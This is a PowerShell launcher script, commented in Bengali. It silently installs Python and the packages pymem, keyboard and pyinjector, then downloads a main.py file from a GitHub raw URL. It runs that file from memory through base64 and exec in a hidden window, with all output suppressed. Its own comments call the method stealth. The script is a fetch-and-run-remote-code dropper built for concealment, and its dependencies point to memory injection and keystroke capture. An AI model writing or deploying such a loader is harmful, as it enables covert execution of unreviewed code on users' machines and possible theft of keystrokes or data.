# main.ps1 – Python ইনস্টল/চেক, ডিপেন্ডেন্সি ইনস্টল, main.py মেমোরি থেকে চালায় (সব ইউজারের জন্য)
param(
    [string]$PythonInstallerUrl = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe",
    [string]$MainPyUrl = "https://raw.githubusercontent.com/official-jahid/bios-v2/refs/heads/main/main.py"
)

# ---- হেল্পার: হিডেন প্রসেস চালানো ----
function Start-HiddenProcess {
    param([string]$FilePath, [string]$Arguments)
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $FilePath
    $psi.Arguments = $Arguments
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $null = [System.Diagnostics.Process]::Start($psi)
}

# ---- ১. পাইথন ইনস্টলেশন ও পাথ ঠিক করা ----
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
if (-not $pythonPath) {
    $installer = "$env:TEMP\python_installer.exe"
    Invoke-WebRequest -Uri $PythonInstallerUrl -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait -WindowStyle Hidden
    Remove-Item $installer -Force
    # এনভায়রনমেন্ট রিফ্রেশ
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
    if (-not $pythonPath) {
        $pythonPath = "$env:ProgramFiles\Python312\python.exe"
        if (-not (Test-Path $pythonPath)) { exit }
    }
}

# ---- ২. পাইথন ডিপেন্ডেন্সি যাচাই ও ইনস্টল (python -m pip) ----
$dependencies = @(
    @{ Name = "pymem";       Module = "pymem" },
    @{ Name = "psutil";      Module = "psutil" },
    @{ Name = "pywin32";     Module = "win32security" },
    @{ Name = "keyboard";    Module = "keyboard" },
    @{ Name = "pyinjector";  Module = "pyinjector" }
)

# পাইপ আপগ্রেড
& $pythonPath -m pip install --upgrade pip --quiet --disable-pip-version-check 2>&1 | Out-Null

foreach ($dep in $dependencies) {
    & $pythonPath -c "import $($dep.Module)" 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) {
        & $pythonPath -m pip install $dep.Name --quiet --disable-pip-version-check 2>&1 | Out-Null
        # পুনরায় চেক
        & $pythonPath -c "import $($dep.Module)" 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            exit 1
        }
    }
}

# ---- ৩. main.py ডাউনলোড ও মেমোরি থেকে চালানো (স্টেলথ) ----
try {
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($MainPyUrl)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
    $b64 = [Convert]::ToBase64String($bytes)
    # stdout/stderr বন্ধ, সম্পূর্ণ নীরব
    $cmd = "-c ""import base64, os, sys; sys.stdout = open(os.devnull, 'w'); sys.stderr = open(os.devnull, 'w'); exec(base64.b64decode('$b64').decode('utf-8'))"""
    Start-HiddenProcess -FilePath $pythonPath -Arguments $cmd
} catch {
    # নীরবে ব্যর্থ
}
# লঞ্চার প্রস্থান (পাইথন ব্যাকগ্রাউন্ডে চলতে থাকে)
